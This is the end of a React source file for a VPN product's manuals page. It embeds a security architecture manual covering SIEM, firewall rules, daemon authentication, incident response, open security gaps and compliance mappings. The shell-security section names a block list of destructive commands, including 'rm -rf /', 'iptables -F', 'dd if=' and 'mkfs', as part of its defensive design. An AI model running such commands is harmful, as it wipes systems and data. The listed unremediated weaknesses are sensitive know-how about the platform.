     Format: JSON with { actor, action, resource, result, severity, metadata }.

  2. Splunk HEC (if configured)
     Endpoint: SPLUNK_HEC_URL (env var)
     Auth: SPLUNK_HEC_TOKEN (env var)
     Event format: Splunk HEC JSON with sourcetype="proxhqvpn:security".

  3. Generic webhook (if configured)
     Endpoint: SIEM_WEBHOOK_URL (env var)
     Auth: SIEM_WEBHOOK_SECRET (env var, sent as X-ProxhqVPN-Signature header)
     Format: standard JSON body — compatible with Elastic, Datadog, PagerDuty.

SIEM dashboard: /siem — aggregates Beacon, Firewall, GhostTrace, GhostChain
events in a unified timeline with severity filtering.

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

11. FIREWALL SUITE & ATR

Components:
  ▸ iptables-restore ruleset generated per-node via GET /api/daemon-inbound/firewall-rules
  ▸ GhostOS rules: compiled symbolic rules → iptables lines
  ▸ Geo-blocking: country-level IP blocks via firewall_geo_blocks table
  ▸ Per-peer rules: WireGuard client-level allow/block/throttle via FORWARD chain

Auto Threat Response (ATR):
  ▸ Monitors INPUT chain perimeter only — never modifies FORWARD chain.
  ▸ WireGuard peer traffic (FORWARD chain, wg0) is always preserved.
  ▸ Automatic ban on: port scan detection, SYN flood, DDoS threshold.
  ▸ Ban duration and thresholds configurable via firewall_atr_policies table.

IPS Signatures:
  ▸ Pattern-based detection via firewall_ips_signatures table.
  ▸ Matches against packet payload strings (iptables -m string).
  ▸ Signature updates via POST /api/firewall/ips/signatures.

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

12. DAEMON SECURITY (mTLS + PSK)

Daemon routes (/api/daemon-inbound/*) are excluded from Clerk auth
(nodes cannot perform browser-based OAuth). Instead:

  PSK Authentication:
    ▸ All daemon-inbound requests must include X-Daemon-PSK: <token> header.
    ▸ Token validated via timingSafeEqual() against DAEMON_PSK env var.
    ▸ Invalid PSK → 401 before any processing.

  mTLS (optional, recommended for production):
    ▸ Generate CA + client cert: bash standalone/scripts/generate-ca-and-mtls.sh
    ▸ Configure node to present client certificate on all daemon callbacks.
    ▸ Verify client certificate in daemon-inbound.ts (not yet enforced — planned).

  Passive-only architecture:
    ▸ Daemon routes only accept inbound data from nodes.
    ▸ No daemon route executes commands on the node.
    ▸ Node-side actions are queued via wgPeerCommandsTable and polled by nodes.

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

13. TRANSPORT SECURITY (HELMET / HSTS / CSP)

  Helmet.js headers applied on all responses:
    ▸ Strict-Transport-Security (HSTS): max-age=31536000; includeSubDomains
    ▸ X-Content-Type-Options: nosniff
    ▸ X-Frame-Options: DENY (clickjacking protection)
    ▸ X-XSS-Protection: 1; mode=block
    ▸ Referrer-Policy: no-referrer
    ▸ Content-Security-Policy: default-src 'self'; script-src 'self' 'unsafe-inline'
      (unsafe-inline required for Vite dev; nonce-based CSP planned for production)

  CORS:
    ▸ Strict regex allowlist — only Replit preview domains and proxhqvpn.com.
    ▸ Non-matching origins receive 403 from CORS middleware.

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

14. RATE LIMITING STRATEGY

  Global:       300 req/min per IP
  Terminal:      20 req/min per IP (shell exec is expensive + dangerous)
  SQL:           30 req/min per IP (external DB queries can be slow)
  Mutate routes: 60 req/min per IP (POST/PUT/DELETE)

  Bypass risk: IP-based limits can be circumvented by proxy rotation.
  Mitigation (planned): userId-based rate limiting on Clerk-authenticated routes.

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

15. SHELL & SQL SECURITY

  Shell (terminal.ts):
    ▸ Command allowlist: only whitelisted commands execute in standard mode.
    ▸ ProxhqVPN Mode: bypasses allowlist, logs ALL commands to audit trail.
    ▸ HARD_BLOCKED patterns: rm -rf /, iptables -F, dd if=, mkfs, etc.
      These patterns are rejected even in ProxhqVPN Mode.
    ▸ Break-glass token: emergency access (logged + SIEM event).

  SQL (sqlquery.ts):
    ▸ Local mode: SELECT-only. All other statements rejected.
    ▸ Comment stripping: prevents SQL comment-based injection bypasses.
    ▸ External mode: full CRUD — only on explicitly added external connections.
    ▸ All queries parameterized via pg driver interface.

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

16. HONEYPOT & DECEPTION NETWORK (SILKWEB)

  The SilkWeb network runs 50 outer + 10 inner WireGuard "silk" nodes —
  these are intentionally enticing targets with fake services.

  Components:
    ▸ Beacon monitors: alert on any access to beacon URLs
    ▸ Spider nodes: crawl inbound request patterns for C2 signatures
    ▸ Worm nodes: propagate through attacker-controlled networks (read-only)
    ▸ Trapped attacker registry: trappedAttackersTable tracks confirmed actors

  When an attacker triggers a silk beacon:
    1. beaconAlertsTable entry created
    2. SIEM event: beacon.triggered (severity: high)
    3. IP added to blockedIpsTable automatically
    4. GhostTrace behavioral analysis triggered

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

17. TOR / OBFUSCATION LAYER

  DPI-resistant tunneling methods:
    ▸ obfs4: obfuscates WireGuard packets as random bytes
    ▸ Shadowsocks: AEAD-encrypted SOCKS5 proxy
    ▸ V2Ray-WebSocket: HTTP upgrade-based tunneling
    ▸ Meek: domain-fronting via CDN (Azure/GCP)
    ▸ Snowflake: WebRTC-based pluggable transport
    ▸ XOR-stream: lightweight XOR cipher for low-latency scenarios

  Tor integration:
    ▸ SOCKS5 proxy to Tor exit (port 9050)
    ▸ Double-hop: WireGuard inside Tor
    ▸ ProxhqVPN-over-Tor: full browser isolation via /onion-browser

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

18. POST-QUANTUM RESISTANCE (PSK)

Threat: Cryptographically relevant quantum computers can break ECDH
(WireGuard's default key exchange — Curve25519) via Shor's algorithm.

Defence: WireGuard PSK (§5.4 of WireGuard paper):
  ▸ A 256-bit symmetric PSK is mixed into the Noise IKpsk2 handshake.
  ▸ Breaking the tunnel requires breaking both Curve25519 (classical) AND
    the PSK (symmetric AES-equivalent security).
  ▸ Symmetric 256-bit keys require 2^128 Grover's-algorithm iterations
    to break — computationally infeasible even for quantum adversaries.

PSK properties in ProxhqVPN:
  ▸ 256-bit random PSK per client, stored AES-256-GCM encrypted.
  ▸ Rotatable on demand via POST /api/wireguard/rotate-psk/:id.
  ▸ Last rotation timestamp shown in downloaded .conf file.
  ▸ Recommended rotation: every 90 days.

Limitation: PSK must be distributed securely (over HTTPS). If the
distribution channel is compromised, PSK protection fails. Future:
Kyber-based KEM for PSK distribution.

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

19. INCIDENT RESPONSE PROCEDURES

  IR-1: Suspected Key Compromise
    1. Immediately rotate PSK: POST /api/wireguard/rotate-psk/:configId
    2. Revoke affected configs: DELETE /api/wireguard/my-config/:id
    3. Reboot the node (destroys RAM key, forces fresh key delivery).
    4. Review audit chain for anomalous download events.
    5. Check GhostTrace for behavioral anomalies from that peer's IP.

  IR-2: Insider Threat / Admin Abuse
    1. Export audit chain immediately: GET /api/security-audit/audit-chain
    2. Verify chain integrity: verifyChain() — any tamper = chain was modified
    3. Rotate ADMIN_EMAILS — remove suspect account.
    4. Revoke Clerk session: Clerk dashboard → Users → Revoke session.
    5. Change PROXHQ_MASTER_KEY_B64 and re-encrypt all configs.

  IR-3: Node Seizure
    1. Power off the node remotely (destroy RAM key).
    2. Remove node from nodesTable: DELETE /api/nodes/:id
    3. Issue new node with fresh keypair.
    4. Notify affected users to re-download configs.
    5. No disk key recovery is possible (RAM-only architecture).

  IR-4: DDoS / Brute Force
    1. ATR auto-bans source IPs on threshold.
    2. Add country block: POST /api/firewall/geo-block if originating from
       a specific region.
    3. Scale rate limits via environment override.
    4. Enable Meek/CDN obfuscation to mask node public IPs.

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

20. SECURITY GAPS & REMEDIATION ROADMAP

OPEN FINDINGS (as of June 2026):

  [HIGH] ZTNA posture not enforced pre-tunnel
    The client does not gate config generation on a passing posture check.
    Fix: Add posture check step to WireGuard config generation flow.
    Owner: frontend / mobile team | ETA: Q3 2026

  [MEDIUM] RBAC not applied to most admin routes
    Most routes use coarse requireAdmin instead of requirePermission().
    Fix: Wire requirePermission() to firewall, terminal, users, audit routes.
    Owner: backend team | ETA: Q3 2026

  [MEDIUM] Audit chain coverage incomplete
    Only ZTNA, WireGuard, and daemon events are instrumented.
    Fix: Add appendAuditEvent() to firewall changes, role changes, SQL queries.
    Owner: backend team | ETA: Q3 2026

  [MEDIUM] mTLS not enforced for daemon callbacks
    PSK is implemented; client cert verification is planned but not active.
    Fix: Verify client certificate CN = node identity in daemon-inbound.ts.
    Owner: backend team | ETA: Q4 2026

  [LOW] No MFA enforcement for privileged roles
    MFA is available via Clerk but not required for owner/security_admin.
    Fix: Configure Clerk organization policy to require TOTP for privileged roles.
    Owner: ops team | ETA: Q3 2026

  [LOW] Session-level rate limiting not implemented
    Rate limits are IP-based only. Session (userId) limits are not in place.
    Fix: Add userId-based rate limiting on sensitive routes.
    Owner: backend team | ETA: Q4 2026

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

21. COMPLIANCE MAPPINGS

  NIST SP 800-207 (Zero Trust Architecture):
    § 3.3.1 Device Health     → ZTNA posture scoring
    § 3.3.2 User Auth         → Clerk JWT + MFA (optional)
    § 3.3.3 Connection Auth   → WireGuard PSK + HMAC
    § 3.3.6 Audit/Monitoring  → SHA3-256 audit chain + SIEM

  CIS Controls v8:
    Control 1  (Asset Mgmt)          → ZTNA device fingerprint registry
    Control 3  (Data Protection)     → AES-256-GCM encrypted keys
    Control 4  (Config)              → ZTNA posture (firewall + disk enc)
    Control 6  (Access Control)      → RBAC + Clerk auth
    Control 7  (Vuln Mgmt)          → ZTNA patchAge signal
    Control 8  (Audit Log)           → SHA3-256 audit chain + SIEM
    Control 12 (Network Monitoring)  → GhostTrace + SilkWeb + ATR
    Control 13 (Monitoring/Defense)  → SIEM fanout + alerting

  SOC 2 Type II / ISO 27001 A.9:
    Access Control     → Clerk auth + RBAC (documented, partially enforced)
    Cryptography       → AES-256-GCM + WireGuard Noise protocol
    Audit Logging      → SHA3-256 chain + HMAC-SHA512 (tamper-evident)
    Incident Response  → Documented IR procedures (§19)

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

22. KEY CONTACTS & ESCALATION

  Security incidents:        security@proxhqvpn.com
  General support:           support@proxhqvpn.com
  Legal / law enforcement:   legal@alphauntechnologies.com
  Warrant canary:            GET /api/warrant-canary
  Bug bounty:                /bug-bounty (upcoming)

  Emergency escalation (production incidents):
    1. Check GhostChain for automated kill chain discovery
    2. Export audit chain for forensic evidence
    3. Activate break-glass terminal access if API is unreachable
    4. Contact security@proxhqvpn.com with [CRITICAL] subject prefix

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

CONFIDENTIAL — RESTRICTED DISTRIBUTION
This document contains security-sensitive architecture details.
Distribute only to authorized personnel with a need-to-know basis.
Copyright © 2026 ALPHA UNLIMITED TECHNOLOGIES LLC`,
  },
];

// ── Category grouping ─────────────────────────────────────────────────────────
const CATEGORIES = [
  {
    label: "VPN & Privacy — Core",
    color: "text-green-400",
    border: "border-green-900",
    bg: "bg-green-950/20",
    ids: [
      "vpn-getting-started", "wireguard-advanced", "mobile-wireguard-manual",
      "privacy-suite-tools", "leak-detection-manual", "dns-shield-manual",
      "obfuscation-manual", "device-manager-manual", "router-setup-manual",
      "smart-dns-manual", "vpngate-manual", "network-monitor-manual",
      "dns-sinkhole-manual", "firewall-manual", "kill-switch-manual",
      "ram-wireguard-manual", "node-hardening-manual", "advanced-firewall-manual",
    ],
  },
  {
    label: "Network & Connectivity",
    color: "text-cyan-400",
    border: "border-cyan-900",
    bg: "bg-cyan-950/20",
    ids: [
      "split-tunnel-manual", "proxy-tor-manual", "onion-browser-manual",
      "meshnet-manual", "vpn-coexist-manual",
    ],
  },
  {
    label: "Advanced Privacy Suite",
    color: "text-violet-400",
    border: "border-violet-900",
    bg: "bg-violet-950/20",
    ids: [
      "post-quantum-manual", "daita-manual", "alt-id-manual",
      "ip-rotator-manual", "data-broker-manual",
    ],
  },
  {
    label: "Command Center Pro — Recon & Testing",
    color: "text-orange-400",
    border: "border-orange-900",
    bg: "bg-orange-950/20",
    ids: [
      "http-probe-manual", "subdomain-scout-manual", "dir-fuzzer-manual",
      "intruder-manual", "payload-gen-manual", "cve-lookup-manual",
      "encoder-decoder-manual", "alpha-toolkit-manual",
    ],
  },
  {
    label: "Command Center Pro — Security Tools",
    color: "text-red-400",
    border: "border-red-900",
    bg: "bg-red-950/20",
    ids: [
      "omnistrike-manual", "waf-analyzer-manual", "social-breach-manual",
      "bug-bounty-hub-manual", "dev-security-tools-v2", "ghost-chain-manual",
      "http-interceptor-manual", "jwt-analyzer-manual", "sqli-scanner-manual",
      "ssl-tls-manual", "iac-scanner-manual", "api-tester-manual",
      "oast-manual", "waf-bypass-manual", "ws-tester-manual",
      "sast-manual", "dep-scanner-manual",
    ],
  },
  {
    label: "Command Center Pro — AI Security",
    color: "text-purple-400",
    border: "border-purple-900",
    bg: "bg-purple-950/20",
    ids: [
      "ghost-pentest-manual", "soc-copilot-manual", "code-sentinel-manual",
      "llm-probe-manual", "ai-shield-manual", "request-mind-manual",
      "agent-strike-manual",
    ],
  },
  {
    label: "Blockchain Security",
    color: "text-cyan-400",
    border: "border-cyan-900",
    bg: "bg-cyan-950/20",
    ids: ["quantum-audit-manual"],
  },
  {
    label: "Intelligence & Monitoring",
    color: "text-blue-400",
    border: "border-blue-900",
    bg: "bg-blue-950/20",
    ids: [
      "osint-recon-manual", "canary-tokens-manual", "siem-manual",
      "ghost-trap-manual", "ghost-trace-manual", "dark-web-monitor-manual",
      "username-intel-manual", "beacon-monitor-manual", "attacker-console-manual",
    ],
  },
  {
    label: "Platform Security",
    color: "text-green-400",
    border: "border-green-900",
    bg: "bg-green-950/20",
    ids: ["security-hardening-v22", "rbac-access-manual", "ztna-posture-manual", "security-arch-v3"],
  },
  {
    label: "Admin & Infrastructure",
    color: "text-amber-400",
    border: "border-amber-900",
    bg: "bg-amber-950/20",
    ids: [
      "employee-procedures", "terminal-manual", "sql-interface-manual",
      "silkweb-manual", "nodes-manual", "performance-monitor-manual",
    ],
  },
];

function downloadManual(manual: Manual) {
  const blob = new Blob([manual.content], { type: "text/plain; charset=utf-8" });
  const url = URL.createObjectURL(blob);
  const a = document.createElement("a");
  a.href = url;
  a.download = `proxhqvpn-${manual.id}-v${manual.version}.txt`;
  a.click();
  URL.revokeObjectURL(url);
}

function downloadAll() {
  MANUALS.forEach((m, i) => {
    setTimeout(() => downloadManual(m), i * 300);
  });
}

// ── Component ─────────────────────────────────────────────────────────────────
export default function Manuals() {
  const [expandedId, setExpandedId] = useState<string | null>(null);
  const [downloaded, setDownloaded] = useState<Set<string>>(new Set());

  const handleDownload = (manual: Manual) => {
    downloadManual(manual);
    setDownloaded(prev => new Set([...prev, manual.id]));
  };

  const toggle = (id: string) => setExpandedId(prev => prev === id ? null : id);

  return (
    <div className="min-h-screen bg-[#0a0a0f] text-gray-100 p-4 md:p-6 max-w-5xl mx-auto space-y-6">
      <PageSEO
        title="ProxhqVPN Manuals — ALPHA UNLIMITED TECHNOLOGIES LLC"
        description="Download comprehensive user manuals for every ProxhqVPN feature."
      />

      {/* Header */}
      <div>
        <div className="flex flex-wrap items-center gap-3 mb-2">
          <BookMarked className="h-7 w-7 text-green-400" />
          <h1 className="text-2xl font-black text-white">ProxhqVPN Manuals</h1>
          <Badge className="bg-green-900 text-green-300 border-green-700">{MANUALS.length} Manuals</Badge>
          <Badge className="bg-blue-900 text-blue-300 border-blue-700">Subscriber Access</Badge>
        </div>
        <p className="text-gray-400 text-sm max-w-2xl">
          Complete documentation for every feature of the ProxhqVPN platform. Available exclusively to active subscribers. All manuals are downloadable as plain text for offline reference.
        </p>

        {/* Download all */}
        <div className="mt-4 flex flex-wrap gap-3">
          <button onClick={downloadAll}
            className="flex items-center gap-2 text-sm font-bold bg-green-900 hover:bg-green-800 border border-green-700 text-green-300 px-4 py-2 rounded-lg transition-colors">
            <Download className="h-4 w-4" /> Download All Manuals
          </button>
          <div className="flex items-center gap-2 bg-amber-950/30 border border-amber-900/50 rounded-lg px-4 py-2 text-xs text-amber-400">
            <FileText className="h-3.5 w-3.5 shrink-0" />
            <span>Copyright © 2026 ALPHA UNLIMITED TECHNOLOGIES LLC — For authorized subscribers only</span>
          </div>
        </div>
      </div>

      {/* Stats */}
      <div className="grid grid-cols-2 sm:grid-cols-4 gap-3">
        {[
          { label: "Total Manuals", value: MANUALS.length, icon: BookOpen, color: "text-green-400" },
          { label: "Total Pages", value: MANUALS.reduce((s, m) => s + m.pages, 0), icon: FileText, color: "text-blue-400" },
          { label: "VPN Manuals", value: MANUALS.filter(m => m.tier === "both").length, icon: Wifi, color: "text-cyan-400" },
          { label: "Pro Manuals", value: MANUALS.filter(m => m.tier === "pro").length, icon: Shield, color: "text-red-400" },
        ].map(s => (
          <div key={s.label} className="bg-gray-900 border border-gray-800 rounded-xl p-4 flex items-center gap-3">
            <s.icon className={`h-5 w-5 ${s.color} shrink-0`} />
            <div>
              <div className="text-xl font-black text-white">{s.value}</div>
              <div className="text-xs text-gray-500">{s.label}</div>
            </div>
          </div>
        ))}
      </div>

      {/* Manuals by category */}
      {CATEGORIES.map(cat => {
        const catManuals = cat.ids.map(id => MANUALS.find(m => m.id === id)!).filter(Boolean);
        return (
          <div key={cat.label} className={`border ${cat.border} ${cat.bg} rounded-xl overflow-hidden`}>
            <div className="px-5 py-3 border-b border-gray-800/50">
              <h2 className={`text-sm font-black uppercase tracking-wider ${cat.color}`}>{cat.label}</h2>
            </div>
            <div className="divide-y divide-gray-800/50">
              {catManuals.map(manual => {
                const isExpanded = expandedId === manual.id;
                const isDownloaded = downloaded.has(manual.id);
                return (
                  <div key={manual.id} className="p-4">
                    <div className="flex items-start gap-4">
                      <div className="shrink-0 mt-1">
                        <manual.icon className={`h-5 w-5 ${manual.iconColor}`} />
                      </div>
                      <div className="flex-1 min-w-0">
                        <div className="flex flex-wrap items-center gap-2 mb-1">
                          <h3 className="text-sm font-bold text-white">{manual.title}</h3>
                          <Badge className="text-[9px] bg-gray-800 text-gray-400 border-gray-700">v{manual.version}</Badge>
                          <Badge className={`text-[9px] ${manual.tier === "pro" ? "bg-red-900 text-red-300 border-red-800" : "bg-blue-900 text-blue-300 border-blue-800"}`}>
                            {manual.tier === "pro" ? "Command Center Pro" : "All Plans"}
                          </Badge>
                          <span className="text-[10px] text-gray-600">{manual.pages} pages</span>
                        </div>
                        <p className="text-xs text-gray-400">{manual.subtitle}</p>
                      </div>
                      <div className="flex items-center gap-2 shrink-0">
                        <button onClick={() => toggle(manual.id)}
                          className="text-xs text-gray-500 hover:text-white transition-colors flex items-center gap-1">
                          {isExpanded ? <><ChevronUp className="h-3.5 w-3.5" />Preview</> : <><ChevronDown className="h-3.5 w-3.5" />Preview</>}
                        </button>
                        <button onClick={() => handleDownload(manual)}
                          className={`flex items-center gap-1.5 text-xs font-bold px-3 py-1.5 rounded-lg border transition-colors ${isDownloaded ? "bg-green-950 text-green-400 border-green-800" : "bg-gray-800 hover:bg-gray-700 text-white border-gray-700"}`}>
                          {isDownloaded ? <><CheckCircle2 className="h-3.5 w-3.5" />Downloaded</> : <><Download className="h-3.5 w-3.5" />Download</>}
                        </button>
                      </div>
                    </div>

                    {/* Preview pane */}
                    {isExpanded && (
                      <div className="mt-3 bg-black rounded-lg border border-gray-800 overflow-hidden">
                        <div className="flex items-center justify-between px-4 py-2 border-b border-gray-800">
                          <span className="text-[10px] font-mono text-gray-500 uppercase tracking-wider">Manual Preview — {manual.title}</span>
                          <button onClick={() => handleDownload(manual)}
                            className="flex items-center gap-1 text-[10px] text-green-400 hover:text-green-300 transition-colors">
                            <Download className="h-3 w-3" /> Download Full Manual
                          </button>
                        </div>
                        <pre className="font-mono text-[10px] text-gray-300 p-4 overflow-x-auto max-h-72 overflow-y-auto leading-relaxed whitespace-pre-wrap">
                          {manual.content.slice(0, 2000)}{manual.content.length > 2000 ? "\n\n[...continued in full manual download...]" : ""}
                        </pre>
                      </div>
                    )}
                  </div>
                );
              })}
            </div>
          </div>
        );
      })}

      {/* Legal footer */}
      <div className="bg-gray-900 border border-gray-800 rounded-xl p-4 text-xs text-gray-500">
        <p className="font-bold text-gray-400 mb-1">ProxhqVPN Manuals — Distribution Notice</p>
        <p>These manuals are proprietary documentation of ALPHA UNLIMITED TECHNOLOGIES LLC. They are provided exclusively to active ProxhqVPN subscribers for personal reference. Redistribution, reproduction, or sharing outside of your organization is strictly prohibited.</p>
        <p className="mt-2">For support: <span className="text-green-400">legal@alphauntechnologies.com</span> | proxhqvpn.com</p>
      </div>
    </div>
  );
}
